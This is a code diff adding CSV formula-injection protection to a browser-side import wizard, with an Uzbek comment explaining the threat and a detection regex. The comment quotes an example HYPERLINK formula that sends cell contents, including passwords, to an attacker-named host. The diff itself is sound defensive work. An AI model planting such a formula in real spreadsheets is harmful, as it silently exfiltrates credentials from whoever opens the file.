@@ -41,12 +41,47 @@ export type ImportWizardProps<TRow> = {
 
 const MAX_VISIBLE_ROWS = 200;
 
+/**
+ * FORMULA INJECTION HIMOYASI — KLIENT TOMONI
+ * ==========================================
+ *
+ * `src/lib/excel.ts` dagi `sanitizeExcelCell` xuddi shu ishni qiladi, lekin u
+ * faqat SERVER tomonda `.xlsx` yasashda (`buildExcel`) ishlaydi. Quyidagi
+ * `downloadCsv` esa brauzerda ishlaydi va tozalanmagan edi — ya'ni PR #66 dagi
+ * himoya bu yo'lni qoplamagan.
+ *
+ * NEGA XAVFLI: `import-xatolar.csv` ga `row.label` (o'quvchi/o'qituvchi ismi)
+ * va `login-parollar.csv` ga `item.name` tushadi. Bu qiymatlar hujumchi
+ * yuklagan Excel faylidan keladi. Ism o'rniga formula yozilsa:
+ *
+ *   =HYPERLINK("https://oqri.uz/?d="&A1&B1,"Xatolarni ko'rish")
+ *
+ * admin CSV ni ochganda Excel uni bajaradi va butun ro'yxatni — shu jumladan
+ * `login-parollar.csv` dagi PAROLLARNI — hujumchining saytiga jo'natadi.
+ * Ma'lumot serverdan emas, adminning kompyuteridan sizadi: server logida
+ * hech qanday iz qolmaydi.
+ *
+ * NEGA `excel.ts` DAN IMPORT QILINMADI: u modul `xlsx` paketini import qiladi.
+ * Bu fayl `"use client"` — import qilsak butun `xlsx` klient bundle'iga
+ * tushib qolardi (yuzlab kilobayt va keraksiz hujum yuzasi). Shuning uchun
+ * regex ataylab takrorlangan; ikkalasi bir xil bo'lib turishi kerak.
+ */
+const DANGEROUS_CELL_START = /^[=+\-@\t\r]/;
+
+function sanitizeCsvCell(value: string): string {
+  if (value === "") return value;
+  return DANGEROUS_CELL_START.test(value) ? `'${value}` : value;
+}
+
 function toCsv(rows: string[][]): string {
   return rows
     .map((row) =>
       row
         .map((cell) => {
-          const value = cell ?? "";
+          // Tartib muhim: avval formula neytrallanadi, keyin qo'shtirnoqqa
+          // olinadi. Teskari tartibda apostrof qo'shtirnoq ichida qolib,
+          // Excel katakni yana formula deb o'qishi mumkin.
+          const value = sanitizeCsvCell(cell ?? "");
           return /[",;\n]/.test(value) ? `"${value.replace(/"/g, '""')}"` : value;
         })
         .join(";")
